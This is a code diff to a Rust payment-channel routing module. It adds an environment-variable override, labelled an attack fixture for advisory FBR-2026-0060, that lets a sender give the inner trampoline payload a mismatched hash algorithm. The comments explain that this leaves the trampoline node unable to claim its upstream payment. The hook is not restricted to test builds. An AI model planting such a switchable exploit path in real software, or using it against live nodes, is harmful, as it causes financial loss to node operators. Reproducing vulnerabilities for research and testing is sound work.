@@ -25,8 +25,8 @@ use fiber_types::protocol::AnnouncedNodeName;
 pub use fiber_types::ChannelUpdateInfo;
 use fiber_types::{
     Attempt, BroadcastMessageID, ChannelAnnouncement, ChannelUpdate, Cursor, FeatureVector,
-    Hash256, HopHint, NodeAnnouncement, PaymentHopData, PaymentSession, PaymentStatus, Privkey,
-    Pubkey, RouterHop, SendPaymentData, TlcErr, UdtCfgInfos,
+    Hash256, HashAlgorithm, HopHint, NodeAnnouncement, PaymentHopData, PaymentSession,
+    PaymentStatus, Privkey, Pubkey, RouterHop, SendPaymentData, TlcErr, UdtCfgInfos,
 };
 use parking_lot::Mutex;
 use rand::{rng, Rng};
@@ -47,6 +47,18 @@ use tracing::{debug, info, trace, warn};
 const DEFAULT_MIN_PROBABILITY: f64 = 0.01;
 // Budget a short forwarding route for each remaining trampoline segment.
 pub(crate) const TRAMPOLINE_FORWARDING_ROUTE_DELTA_COUNT: u64 = 3;
+
+/// FBR-2026-0060 attack fixture: when `FIBER_TEST_TRAMPOLINE_INNER_HASH_ALGORITHM`
+/// is set (e.g. `sha256`), the inner trampoline hop payload asks the trampoline
+/// node to forward with that hash algorithm while the outer payment session keeps
+/// its own. Unset means the payload follows the payment session, as upstream does.
+fn trampoline_inner_hash_algorithm_override() -> Option<HashAlgorithm> {
+    match std::env::var("FIBER_TEST_TRAMPOLINE_INNER_HASH_ALGORITHM").as_deref() {
+        Ok("sha256") => Some(HashAlgorithm::Sha256),
+        Ok("ckb_hash") => Some(HashAlgorithm::CkbHash),
+        _ => None,
+    }
+}
 
 #[cfg(all(test, not(target_arch = "wasm32")))]
 static FIND_PATH_CALL_COUNT_FOR_TESTS: AtomicU64 = AtomicU64::new(0);
@@ -1671,7 +1683,15 @@ where
                     "trampoline forward amount",
                 )?,
                 build_max_fee_amount: fees[idx],
-                hash_algorithm: payment_data.hash_algorithm(),
+                // FBR-2026-0060 attack fixture: a malicious sender can set
+                // FIBER_TEST_TRAMPOLINE_INNER_HASH_ALGORITHM (e.g. `sha256`) so the
+                // inner trampoline payload asks the trampoline node to forward with
+                // a different hash algorithm than the outer payment session. The
+                // trampoline node then pays downstream under one algorithm while its
+                // upstream TLC locks the same payment hash under another, so the
+                // revealed preimage can never claim the upstream TLC.
+                hash_algorithm: trampoline_inner_hash_algorithm_override()
+                    .unwrap_or_else(|| payment_data.hash_algorithm()),
                 tlc_expiry_limit: payment_data.tlc_expiry_limit,
                 tlc_expiry_delta: self.trampoline_forward_expiry_delta(
                     payment_data.final_tlc_expiry_delta,
